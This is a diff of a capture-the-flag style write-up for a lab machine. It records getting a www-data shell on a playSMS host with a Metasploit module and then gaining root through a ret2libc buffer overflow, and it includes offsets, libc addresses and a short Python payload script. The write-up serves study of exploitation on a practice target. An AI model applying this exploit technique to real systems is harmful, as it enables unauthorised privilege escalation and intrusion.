@@ -2,6 +2,8 @@
 
 ## Summary
 
+I find a vulnerable application `playsms`, use a metasploit module to pop a shell as `www-data`, and write a ROP exploit to get `root`.
+
 ## Enumeration
 
 I start a portscan of all ports (`-p-`), running OS, service version, and vulnerability scripts (`-A`), skipping host discovery (`-Pn`), with verbose logging (`-v`) and output to a file (`-oN`).
@@ -35,6 +37,10 @@ PORT     STATE SERVICE     REASON         VERSION
 |_http-title: Welcome to nginx!
 Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 3.18 (95%), Linux 4.2 (95%)
 ```
+
+### Port 1880
+
+![](img/2020-10-26-17-18-00.png)
 
 ### Port 9999
 
@@ -86,22 +92,76 @@ $ gobuster dir -u http://10.10.10.111:9999/ -w /usr/share/seclists/Discovery/Web
 
 ![](img/2020-10-26-17-46-35.png)
 
-
-
-### Port 1880
-
-![](img/2020-10-26-17-18-00.png)
-
-
-
-The current attack surface is:
-
--
-
 ## Reverse Shell
+
+Guessed this exploit would work -- and it does.
+
+![](img/2020-10-30-16-39-57.png)
 
 ## Upgrading Shell
 
+![](img/2020-10-30-16-41-30.png)
+
+## User Proof
+
+Readable as `www-data`.
+
+![](img/2020-10-30-16-42-11.png)
+
 ## Privilege Escalation
 
-## Proof
+ROP time.
+
+![](img/2020-10-30-17-03-59.png)
+
+![](img/2020-10-30-17-04-35.png)
+
+I pull the binary to my host to work on developing an exploit.
+
+![](img/2020-10-30-17-04-08.png)
+
+Find offset.
+
+![](img/2020-10-30-17-03-13.png)
+
+![](img/2020-10-30-17-05-48.png)
+
+![](img/2020-10-30-17-28-29.png)
+
+The offset is 52 bytes. 
+
+The `libc` address is: `0xb7e19000`.
+
+![](img/2020-11-01-19-31-25.png)
+
+The `system` offset in `libc` is: `0x0003ada0`.
+
+![](img/2020-11-01-19-32-04.png)
+
+The `exit` offset in `libc` is: `0x0002e9d0`
+
+![](img/2020-11-01-19-33-50.png)
+
+And the offset of `/bin/sh` in `libc` is: `0x0015ba0b`.
+
+![](img/2020-11-01-20-25-30.png)
+
+```python
+#!/bin/env python
+
+from struct import pack
+
+padding = "A" * 52
+
+libc = 0xb7e19000
+system = pack('<I', libc + 0x0003ada0)
+exit = pack('<I', libc + 0x0002e9d0)
+binsh = pack('<I', libc + 0x0015ba0b)
+
+payload = padding + system + exit + binsh
+print payload
+```
+
+I compose the exploit, move it over to the target and run it. I am now `root`.
+
+![](img/2020-11-01-20-42-10.png)
